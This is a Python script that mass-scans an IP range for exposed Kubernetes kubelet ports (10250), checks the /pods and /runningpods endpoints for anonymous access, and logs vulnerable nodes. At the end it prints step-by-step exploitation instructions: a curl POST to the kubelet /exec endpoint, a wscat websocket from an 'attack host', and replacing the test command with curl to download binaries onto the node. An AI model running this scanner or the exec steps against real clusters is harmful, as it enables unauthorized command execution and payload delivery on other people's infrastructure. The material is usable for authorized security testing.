import socket
import ipaddress
from ipaddress import IPv4Address, IPv4Network
import threading
from queue import Queue
import requests
import sys
from optparse import OptionParser

if (len(sys.argv) < 5 and '-h' not in sys.argv):
    print("Usage: python3 %s -r <range> -t <threads>" % sys.argv[0])
    sys.exit(1)

parser = OptionParser()
parser.add_option("-r", "--range", help="Network range to check")
parser.add_option("-t", "--threads", help="Number of threads to use")
(options, args) = parser.parse_args()


count = 0
iplist = []
iprange = options.range
port = 10250
numthreads = options.threads
outfile = open("outfile.txt","w")
portopenlist = []
unauthexec = []
authexeclist = []
unsuccessful = []

def Connector(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.7)
        result = sock.connect_ex((str(ip),port))
        sock.close()
        if result == 0:
            print("\033[92mPort " + str(port) + " OPEN on %s\033[0m" % str(ip))
            outfile.write("Port " + str(port) + " OPEN on %s\n" % str(ip))
            portopenlist.append(str(ip))
        
    except Exception as e:
        print(e)

def threader():
    while True:
        worker = q.get()
        Connector(worker)
        q.task_done()


def execchecker(host):
    url = "https://" + host + ":" + str(port) + "/pods"
    url2 = "https://" + host + ":" + str(port) + "/runningpods"
    
    try:
        response = requests.get(url, verify=False, timeout=1)
        response2 = requests.get(url2, verify=False, timeout=1)
        
        if (response.status_code == 200 and ('namespace' in response.text or 'Namespace' in response.text) and ('pod' in response.text or 'Pod' in response.text)):
            print("+"*40)
            print("\033[91mKubernetes node allowing system:anonymous viewing of pods found: %s\033[0m" % url)
            outfile.write("Kubernetes node allowing system:anonymous viewing of pods found:\n")
            outfile.write(url)
            outfile.write("\n")
            unauthexec.append(url)
        elif response.status_code == 401 or response.status_code == 403:
            print("+"*40)
            print('\033[33mKubernetes node returned "unauthorized" response: %s\033[0m' % url)
            outfile.write('Kubernetes node returned "unauthorized" response:\n')
            outfile.write(url)
            outfile.write("\n")
            authexec.append(url)
        else:
            pass
        
        if (response2.status_code == 200 and ('namespace' in response2.text or 'Namespace' in response2.text) and ('pod' in response2.text or 'Pod' in response2.text)):
            print("+"*40)
            print("\033[91mKubernetes node allowing system:anonymous viewing of pods found: %s\033[0m" % url2)
            outfile.write("Kubernetes node allowing system:anonymous viewing of pods found:\n")
            outfile.write(url2)
            outfile.write("\n")
            unauthexec.append(url2)
        elif response2.status_code == 401 or response2.status_code == 403:
            print("+"*40)
            print('\033[33mKubernetes node returned "unauthorized" response: %s\033[0m' % url2)
            outfile.write('Kubernetes node returned "unauthorized" response:\n')
            outfile.write(url2)
            outfile.write("\n")
            authexec.append(url2)
        else:
            pass
            
    except:
        pass

def threader2():
    while True:
        worker2 = q2.get()
        execchecker(worker2)
        q2.task_done()

q = Queue()

for ip in ipaddress.IPv4Network(iprange):
    count = count + 1
    iplist.append(str(ip))
    
for x in range(int(numthreads)):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()

for worker in iplist:
    q.put(worker)

q.join()

q2 = Queue()

for y in range(200):
    t2 = threading.Thread(target=threader2)
    t2.daemon = True
    t2.start()

for worker2 in portopenlist:
    item = str(ipaddress.IPv4Address(worker2))
    q2.put(item)

q2.join()


if len(unauthexec) > 0:
    print("+"*40)
    print("Since it appears you found at least 1 kubernetes node allowing unauthenticated exec API access, try the following steps to gain command execution:")
    print("1. Pick a namespace, pod, and container name from the /pods results on the kubernetes node.")
    print('2. Run the following curl command: curl -k -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://<kube-node>:10250/exec/<namespace>/<pod>/<container>?command=id&input=1&output=1&tty=1"')
    print('3. In the server response, look for the Location: <value>. You will next open a web socket to that location')
    print('4. Assuming use of wscat from your attack host, run: wscat -c "https://<kube-node>:10250/<location-path-value>" --no-check')
    print('5. Your wscat results from #4 above will show the results of the shell command executed. In this case the "id" command was run.')
    print('6. You can replace the "id" command with any other commands you want, such as curl to pull down binaries. If using curl, you will have one command value for each curl function (ex:command=curl&command="<url>"&command="-O" to download and write a file do disk)')
else:
    print("+"*40)
    print("No Kubernetes nodes with unauthenticated exec API access found.")
                       

outfile.close()        
print("+"*40)
print("DONE!")
print("Data written to outfile.txt in the current directory.")
print("+"*40)
